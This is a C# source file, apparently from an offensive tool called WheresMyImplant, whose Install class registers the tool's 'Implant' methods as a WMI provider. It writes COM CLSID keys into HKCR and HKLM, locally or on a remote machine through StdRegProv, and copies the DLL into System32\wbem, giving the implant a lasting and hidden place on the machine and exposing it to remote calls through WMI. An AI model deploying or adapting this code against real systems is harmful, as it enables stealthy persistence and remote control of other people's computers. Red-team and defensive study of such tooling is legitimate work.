using System;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;

using Microsoft.Win32;

namespace WheresMyImplant
{
    class Install : Base
    {
        String statusMethods;
        String statusRegistry;

        String system;
        String namespaceName;
        String providerDisplayName;

        private const UInt32 hkcrHive = 2147483648;
        private const UInt32 hklmHive = 2147483650;

        private String[] hkcrKeys;
        private String[] hklmKeys;

        private String dotNetVersion = "4.0.0.0";
        private String clrVersion = "v4.0.30319";

        private ManagementScope managementScope;
        private ManagementClass managementClass;

        private String runtimePath = RuntimeEnvironment.GetRuntimeDirectory();
        private Assembly assembly = Assembly.GetExecutingAssembly();
        private AssemblyName systemManagementName;

        internal Install(String system, String namespaceName, String providerDisplayName)
        {
            this.system = system;
            this.namespaceName = namespaceName;
            this.providerDisplayName = providerDisplayName;

            systemManagementName = AssemblyName.GetAssemblyName(String.Format("{0}{1}", runtimePath, "System.Management.dll"));

            String providerGuid = "{"+(new Guid("2A7B042D-578A-4366-9A3D-154C0498458E").ToString().ToUpper())+"}";
            
            hkcrKeys = new String[] { 
                String.Format(@"CLSID\{0}", providerGuid.ToString()), 
                String.Format(@"WOW6432Node\CLSID\{0}", providerGuid.ToString()) 
            };
            
            hklmKeys = new String[] { 
                String.Format(@"SOFTWARE\Classes\CLSID\{0}", providerGuid.ToString()), 
                String.Format(@"SOFTWARE\Classes\WOW6432Node\CLSID\{0}", providerGuid.ToString()), 
                String.Format(@"SOFTWARE\WOW6432Node\Classes\CLSID\{0}", providerGuid.ToString()) 
            };

            ConnectionOptions connectionOptions = new ConnectionOptions();
            connectionOptions.Impersonation = ImpersonationLevel.Impersonate;

            String connectionString = String.Format(@"\\{0}\{1}", system, namespaceName);
            managementScope = new ManagementScope(connectionString, connectionOptions);

            ManagementPath managementPath = new ManagementPath();
            ObjectGetOptions options = new ObjectGetOptions();
            managementClass = new ManagementClass(managementScope, managementPath, options);

            managementClass["__class"] = providerDisplayName;
            managementClass.Qualifiers.Add("dynamic", true, false, true, false, true);
            managementClass.Qualifiers.Add("provider", assembly.FullName, false, false, false, true);
        }

        internal void Connect()
        {
            managementScope.Connect();
        }

        internal void GetMethods()
        {
            Type className = assembly.GetTypes()
                .Where(t => t.Namespace == "WheresMyImplant").Distinct()
                .Where(t => t.Name == "Implant").First();
            WriteOutputNeutral("Adding Methods");

            foreach (MethodInfo methodInfo in className.GetMethods())
            {
                String methodName = methodInfo.Name;
                if (methodName == "GetType" | 
                    methodName == "Equals" | 
                    methodName == "ToString" | 
                    methodName == "GetHashCode" | 
                    methodName == "Install")
                {
                    continue;
                }
                ParameterInfo[] inputParameterInfo = methodInfo.GetParameters();

                ManagementClass inProperties = NewParameter("In");
                Int32 i = 0;
                foreach (ParameterInfo info in inputParameterInfo)
                {
                    inProperties.Properties.Add(info.Name, CimType.String, false);
                    inProperties.Properties[info.Name].Qualifiers.Add("ID", i);
                    i++;
                }
                
                ManagementClass outProperties = NewParameter("Out");
                outProperties.Properties.Add("ReturnValue", CimType.String, false);
                outProperties.Properties["ReturnValue"].Qualifiers.Add("Out", true);

                IntPtr inPtr = (IntPtr)inProperties;
                IntPtr outPtr = (IntPtr)outProperties;

                managementClass.Methods.Add(methodName, NewManagementBaseObject(inPtr), NewManagementBaseObject(outPtr));
                managementClass.Methods[methodName].Qualifiers.Add("Static", true);
                managementClass.Methods[methodName].Qualifiers.Add("Implemented", true);

                statusMethods += ".";
            }
            managementClass.Put();
            WriteOutput(statusMethods);
        }

        internal void AddRegistryLocal()
        {
            String registryProvider = String.Format(@"System.Management.Instrumentation, Version={0}, Culture=neutral, PublicKeyToken=b77a5c561934e089", dotNetVersion);
            String dllProvider = @"C:\Windows\System32\mscoree.dll";
            String dllProviderClass = @"System.Management.Instrumentation.ManagedCommonProvider";
            WriteOutputNeutral("Adding Registry Keys");

            foreach (String key in hkcrKeys)
            {
                RegistryKey key1 = Registry.ClassesRoot.CreateSubKey(key);
                key1.SetValue("", dllProviderClass);

                String keyValue2 = String.Format(@"{0}\InprocServer32", key);
                RegistryKey key2 = Registry.ClassesRoot.CreateSubKey(keyValue2);
                key2.SetValue("", dllProvider);
                key2.SetValue("Assembly", registryProvider);
                key2.SetValue("Class", dllProviderClass);
                key2.SetValue("RuntimeVersion", clrVersion);
                key2.SetValue("ThreadingModel", "Both");

                String keyValue3 = String.Format(@"{0}\InprocServer32\{1}", key, dotNetVersion);
                RegistryKey key3 = Registry.ClassesRoot.CreateSubKey(keyValue3);
                key3.SetValue("Assembly", registryProvider);
                key3.SetValue("Class", dllProviderClass);
                key3.SetValue("RuntimeVersion", clrVersion);

                statusRegistry += ".";
            }

            foreach (String key in hklmKeys)
            {
                RegistryKey key1 = Registry.LocalMachine.CreateSubKey(key);
                key1.SetValue("", dllProviderClass);

                String keyValue2 = String.Format(@"{0}\InprocServer32", key);
                RegistryKey key2 = Registry.LocalMachine.CreateSubKey(keyValue2);
                key2.SetValue("", dllProvider);
                key2.SetValue("Assembly", registryProvider);
                key2.SetValue("Class", dllProviderClass);
                key2.SetValue("RuntimeVersion", clrVersion);
                key2.SetValue("ThreadingModel", "Both");

                String keyValue3 = String.Format(@"{0}\InprocServer32\{1}", key, dotNetVersion);
                RegistryKey key3 = Registry.LocalMachine.CreateSubKey(keyValue3);
                key3.SetValue("Assembly", registryProvider);
                key3.SetValue("Class", dllProviderClass);
                key3.SetValue("RuntimeVersion", clrVersion);

                statusRegistry += ".";
            }
            WriteOutput(statusRegistry);
        }

        internal void AddRegistryRemote(String[] keys, UInt32 hive)
        {
            String registryProvider = String.Format(@"System.Management.Instrumentation, Version={0}, Culture=neutral, PublicKeyToken=b77a5c561934e089", dotNetVersion);
            String dllProvider = @"C:\Windows\System32\mscoree.dll";
            String dllProviderClass = @"System.Management.Instrumentation.ManagedCommonProvider";

            using (WMI wmi = new WMI())
            {
                if (!wmi.Connect())
                {
                    WriteOutput("[-] Connection failed");
                    return;
                }
                foreach (String key in keys)
                {
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, key });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, key, "", dllProviderClass });

                    String keyValue2 = String.Format(@"{0}\InprocServer32", key);
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "", dllProvider });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "Assembly", registryProvider });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "Class", dllProviderClass });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "RuntimeVersion", clrVersion });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue2, "ThreadingModel", "Both" });

                    String keyValue3 = String.Format(@"{0}\InprocServer32\{1}", key, dotNetVersion);
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue3, "Assembly", registryProvider });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue3, "Class", dllProviderClass });
                    wmi.ExecuteMethod("StdRegProv", "CreateKey", new Object[] { hive, keyValue3, "RuntimeVersion", clrVersion });
                }
            }
        }

        internal void CopyDll()
        {
            String filename = Assembly.GetExecutingAssembly().CodeBase;
            UriBuilder uri = new UriBuilder(filename);
            String filePath = Uri.UnescapeDataString(uri.Path);

            Byte[] fileBytes;
            using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
            {
                using (BinaryReader binaryReader = new BinaryReader(fileStream))
                {
                    fileBytes = new Byte[binaryReader.BaseStream.Length];
                    binaryReader.Read(fileBytes, 0, (Int32)binaryReader.BaseStream.Length);
                }
            }

            String destination = Environment.GetEnvironmentVariable("WINDIR") + @"\System32\wbem\" + Assembly.GetExecutingAssembly().GetName().Name + ".dll";
            using (FileStream fileStream = new FileStream(destination, FileMode.OpenOrCreate))
            {
                using (BinaryWriter binaryWriter = new BinaryWriter(fileStream))
                {
                    binaryWriter.Write(fileBytes, 0, fileBytes.Length);
                }
            }
            WriteOutputGood(String.Format("Copied assembly to {0}", destination));
            fileBytes = null;
        }

        private ManagementBaseObject NewManagementBaseObject(IntPtr tempPtr)
        {
            Type IWbemClassObjectFreeThreaded = Type.GetType("System.Management.IWbemClassObjectFreeThreaded, " + systemManagementName.FullName);
            ConstructorInfo IWbemClassObjectFreeThreaded_ctor = IWbemClassObjectFreeThreaded.GetConstructors().First();
            Object IWbemClassObjectFreeThreadedInstance = IWbemClassObjectFreeThreaded_ctor.Invoke(new Object[] { tempPtr });

            Type ManagementBaseObject = Type.GetType("System.Management.ManagementBaseObject, " + systemManagementName.FullName);
            ConstructorInfo[] ManagementBaseObject_ctor = ManagementBaseObject.GetConstructors(BindingFlags.NonPublic | BindingFlags.Instance);
            return (ManagementBaseObject)ManagementBaseObject_ctor.Last().Invoke(new Object[] { IWbemClassObjectFreeThreadedInstance });
        }

        private ManagementClass NewParameter(String direction)
        {
            ObjectGetOptions options = new ObjectGetOptions();
            ManagementClass __PARAMETERS = new ManagementClass(@"ROOT\cimv2", "__PARAMETERS", null);
            ManagementClass parameters = (ManagementClass)__PARAMETERS.Clone();
            parameters.Qualifiers.Add(direction, true);
            return parameters;
        }
    }
}